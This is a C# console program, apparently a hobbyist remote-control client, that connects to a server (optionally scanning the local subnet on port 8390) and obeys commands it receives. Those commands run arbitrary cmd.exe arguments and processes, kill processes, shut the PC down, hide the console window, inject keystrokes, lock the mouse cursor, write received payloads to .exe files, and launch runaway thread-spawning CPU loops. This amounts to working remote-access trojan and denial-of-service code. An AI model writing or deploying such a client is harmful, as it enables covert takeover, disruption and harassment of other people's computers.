﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.Net.WebSockets;
using System.Net.Sockets;
using System.IO;
using System.Threading;
using System.Diagnostics;
using System.Windows;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Drawing;

namespace TCP_Client
{
    class Program
    {

        public static Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
        public static string ServerIP = "";
        public static int ServerPort = 0;
        public static bool CheckingReceive = true;
        public static bool CheckingSend = true;

        public static bool MouseCapture = false;
        public static Point ReceiveMousePos;

        public static int FileCount = 0;

        public static string data = "";

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
        const int SW_SHOW = 5;

        [STAThread]
        public static void Main()
        {
            ServerIP = "";
            ServerPort = 0;

            Console.WriteLine("Type server IP address. (Leave blank for localhost) (Type 'scan' to scan for server)");

            ServerIP = Console.ReadLine();

            if (ServerIP == "")
            {
                IPHostEntry ipHostInfo = Dns.Resolve(Dns.GetHostName());
                IPAddress ipAddress = ipHostInfo.AddressList[0];

                ServerIP = ipAddress.ToString();
            }

            if (ServerIP == "scan")
            {
                IPHostEntry ipHostInfo = Dns.Resolve(Dns.GetHostName());
                IPAddress ipAddress = ipHostInfo.AddressList[0];

                ServerIP = ipAddress.ToString();

                string[] SplitIP = ServerIP.Split('.');

                string NoV4IP = "";
                int length = 0;

                //Removes the numbers after the last decimal point
                foreach (string num in SplitIP)
                {
                    if (length > (SplitIP.Length - 2))
                    {
                        continue;
                    }
                    else
                    {
                        NoV4IP = NoV4IP + num + ".";
                        length++;
                    }
                }
                Console.WriteLine("Scanning for IPv4 on: " + NoV4IP);

                int IPv4Count = 0;
                string IPV4 = "";
                bool Scanning = true;
                ServerPort = 8390;

                while (Scanning)
                {
                    IPv4Count++;
                    IPV4 = NoV4IP + IPv4Count;

                    System.Net.IPAddress ipAdd = System.Net.IPAddress.Parse(IPV4);
                    System.Net.IPEndPoint remoteEP = new IPEndPoint(ipAdd, ServerPort);

                    try
                    {
                        Console.WriteLine($"Trying IPv4: {IPV4}");

                        Stopwatch stopWatch = new Stopwatch();
                        stopWatch.Start();

                        socket.Connect(remoteEP);

                        Thread t = new Thread(new ThreadStart(CheckReceiveData));
                        t.Start();

                        Scanning = false;

                        Console.WriteLine("Connected.");

                        SendingData();
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine(ex.Message);
                        Console.WriteLine($"{IPV4} Failed...");
                        Console.WriteLine("");
                    }
                }
            }


            Console.WriteLine("Type server port. (Leave blank for default)");

            try
            {
                ServerPort = int.Parse(Console.ReadLine());
            }
            catch
            {
                Console.WriteLine("Error converting port.");
                Console.WriteLine("Using default port...");
                ServerPort = 8390;
            }

            if (ServerPort == 0)
            {
                Console.WriteLine("Using default port...");
                ServerPort = 8390;
            }


                StartActiveConnection();
        }


        public static void StartActiveConnection()
        {

            System.Net.IPAddress ipAdd = System.Net.IPAddress.Parse(ServerIP);
            System.Net.IPEndPoint remoteEP = new IPEndPoint(ipAdd, ServerPort);

            try
            {
                Console.WriteLine("Trying to connect to server...");
                socket.Connect(remoteEP);

                Thread t = new Thread(new ThreadStart(CheckReceiveData));
                t.Start();
            }
            catch (Exception ex)
            {
                Console.WriteLine("");
                Console.WriteLine("Connection failed...");

                Console.WriteLine(ex.Message);

                Console.Write("Press enter to try again.");
                Console.ReadLine();
                Console.WriteLine("");
                Console.WriteLine("");

                Main();
            }


            if (socket.Connected)
            {
                Console.WriteLine("Connected.");

                SendingData();
            }

        }

        public static void SendingData()
        {
            while (CheckingSend == true)
            try
            {
                    Console.WriteLine("");
                    Console.Write($"ToServer@{ServerIP}:{ServerPort}: ");
                string msg = Console.ReadLine();

                byte[] byData = System.Text.Encoding.ASCII.GetBytes(msg);
                socket.Send(byData);

                SendingData();

            }
            catch (Exception ex)
            {
                Console.WriteLine("");

                Console.WriteLine(ex.Message);

                Console.WriteLine("");

                Console.WriteLine("Press any key to exit.");
                Console.Read();
            }
        }

        public static Thread appt;

        public static Thread lagst;

        public static Thread msgt;

        static void CheckReceiveData()
        {
            while (CheckingReceive == true)
            {
                try
                {
                    System.Threading.Thread.Sleep(200);
                    data = "";

                    byte[] bytes = new byte[1024];
                    int bytesRec = socket.Receive(bytes);
                    data += Encoding.ASCII.GetString(bytes, 0, bytesRec);

                    Console.WriteLine("");
                    Console.WriteLine($"FromServer@{socket.LocalEndPoint}: " + data);

                    if (data.Contains("9123541723"))
                    {
                        string filedata = data.Replace("9123541723", "");

                        FileCount++;

                        System.IO.StreamWriter file = new System.IO.StreamWriter($"File{FileCount.ToString()}.exe");
                        file.WriteLine(filedata);
                    }

                        if (data == "/shutdown")
                    {
                        Console.WriteLine("Shutdown command received.");

                        Process.Start("shutdown", "/s /t 0");
                    }
                    
                    if (data == "/col start")
                    {
                        appt = new Thread(new ThreadStart(ColourSpam));
                        appt.Start();
                    }

                    if (data == "/col stop")
                    {
                        try
                        {
                            FrmColourSpam.t.Abort();
                            Application.Exit();
                            appt.Abort();
                        }
                        catch { }
                    }

                    if (data == "/lag start")
                    {
                        lagst = new Thread(new ThreadStart(LagStartThread));
                        lagst.Start();
                    }

                    if (data == "/lag stop")
                    {
                        lagst.Abort();
                        lagt.Abort();
                    }

                    if (data == "/dc")
                    {
                        Console.WriteLine("Client connection closed by client.");

                        CheckingSend = false;
                        CheckingReceive = false;

                        Console.WriteLine("");

                        Console.WriteLine("Press enter to exit.");
                        Console.Read();
                        Environment.Exit(0);
                    }

                    if (data == "/hide")
                    {
                        var handle = GetConsoleWindow();

                        ShowWindow(handle, SW_HIDE);
                    }

                    if (data == "/show")
                    {
                        var handle = GetConsoleWindow();

                        ShowWindow(handle, SW_SHOW);
                    }

                    if (data == "/mousecap start")
                    {
                        MouseCapture = true;

                        Thread MouseCapT = new Thread(new ThreadStart(MosueCaptureCheck));
                        MouseCapT.Start();
                    }

                    if (data == "/mousecap stop")
                    {
                        MouseCapture = false;
                    }

                    if (data.Contains ("/msg "))
                    {

                        msgt = new Thread(new ThreadStart(ShowNewMessage));
                        msgt.Start();

                    }

                    if (data == "/msgremove")
                    {
                        msgt.Abort();
                        SendKeys.SendWait("{ESC}");
                    }

                    if (data.Contains("/sendkeys "))
                    {
                        if (data == "/sendkeys enter")
                        {
                            SendKeys.SendWait("{ENTER}");
                        }
                        else if (data == "/sendkeys space")
                        {
                            SendKeys.SendWait("{SPACE}");
                        }
                        else if (data == "/sendkeys tab")
                        {
                            SendKeys.SendWait("{TAB}");
                        }
                        else if (data == "/sendkeys esc")
                        {
                            SendKeys.SendWait("{ESC}");
                        }
                        else
                        {
                            string tempdata = data.Replace("/sendkeys ", "");
                            List<string> Keys = tempdata.Split().ToList();

                            foreach (string key in Keys)
                            {
                                SendKeys.SendWait($"{key}");
                                if (key == " ")
                                {
                                    SendKeys.SendWait("{SPACE}");
                                }
                            }
                        }
                    }

                    string tempproc;

                    if (data.Contains("/proc start "))
                    {
                        tempproc = data.Replace("/proc start ", "");
                        Process.Start(tempproc);
                    }

                    if (data.Contains("/proc stop "))
                    {
                        string tempdata = data.Replace("/proc stop ", "");

                        Process[] workers = Process.GetProcessesByName(tempdata);
                        foreach (Process worker in workers)
                        {
                            worker.Kill();
                            worker.WaitForExit();
                            worker.Dispose();
                        }
                    }

                    if (data.Contains("/cmd "))
                    {
                        string tempdata = data.Replace("/cmd ", "");
                        Process.Start("cmd.exe", tempdata);
                    }

                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);
                }
            }
        }

        static void MosueCaptureCheck()
        {
            while (true)
            {
                while (MouseCapture)
                {
                    Cursor.Position = ReceiveMousePos;
                }
                Thread.Sleep(500);
            }
        }

        static void ColourSpam()
        {
            Application.EnableVisualStyles();
            Application.Run(new FrmColourSpam());
        }

        static void ShowNewMessage()
        {
            string tempdata = data.Replace("/msg ", "");

            MessageBox.Show(tempdata);
        }

        public static Thread lagt;

        static void LagStartThread()
        {
            while (true)
            {
                try
                {
                    lagt = new Thread(new ThreadStart(LagThread));
                    lagt.Start();
                }
                catch { }
            }
        }

        static void LagThread()
        {
            while (true)
            {
                try
                {
                    Int64 i;
                    i = 99;
                    Math.Log(i);
                    Math.Log10(i);
                    Math.Cos(i);
                    Math.Acos(i);
                }
                catch { }
            }
        }

    }
}
